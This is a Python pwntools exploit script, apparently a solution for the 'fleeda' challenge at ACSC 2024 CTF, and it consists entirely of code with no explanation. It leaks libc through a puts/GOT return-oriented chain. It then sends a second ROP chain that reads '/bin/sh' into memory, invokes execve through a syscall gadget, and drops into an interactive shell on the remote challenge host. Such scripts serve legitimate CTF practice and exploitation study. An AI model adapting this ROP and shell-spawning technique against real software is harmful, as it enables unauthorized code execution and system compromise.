#!/usr/bin/python3

from pwn import *

exe = ELF('prog_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
                b* 0x401086
                c
                c
                c
                ''')
        input()


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)


if args.REMOTE:
    p = remote('fleeda.chal.2024.ctf.acsc.asia', 8109)
    p.recvuntil(b'> ')
    p.sendline(input())
else:
    p = process(exe.path)

GDB()

sleep(1)
mov_rdi_rdx_puts = 0x0000000000401083
sl(flat(exe.got.puts, exe.got.puts, exe.got.puts,
        mov_rdi_rdx_puts,
        exe.sym.main, exe.sym.main, exe.sym.main, exe.sym.main,
        ))
p.recvline()
if args.REMOTE:
    p.recvline()
libc.address = u64(p.recvline(keepends=False).ljust(8, b'\0')) - libc.sym.puts
info("libc.address: " + hex(libc.address))
pop_rdi = 0x000000000002a3e5 + libc.address
pop_rsi = libc.address + 0x000000000002be51
pop_rdx_r12 = libc.address + 0x000000000011f2e7
pop_rax = libc.address + 0x0000000000045eb0
pop_rbx =0x0000000000035dd1 + libc.address
sleep(1)
pa = flat(0, next(libc.search(b'/bin/sh')), next(libc.search(b'/bin/sh')),
        pop_rdi, 0x404200,
        pop_rsi, 0x404200,
        pop_rdx_r12, 0x100, 0,
        libc.sym.gets,
        
        pop_rax, 0x0b,
        pop_rbx, 0x404200,
        libc.address + 0x000000000003d1ee, 0,
        pop_rdx_r12, 0, 0,
        libc.address + 0x00000000000f2ec2,

        )
print(len(pa))
sl(pa)
sleep(1)
pa = b'/bin/sh'.ljust(0x10, b'\0') + flat(0x3, 0x404240, 0)

sl(pa)

p.interactive()
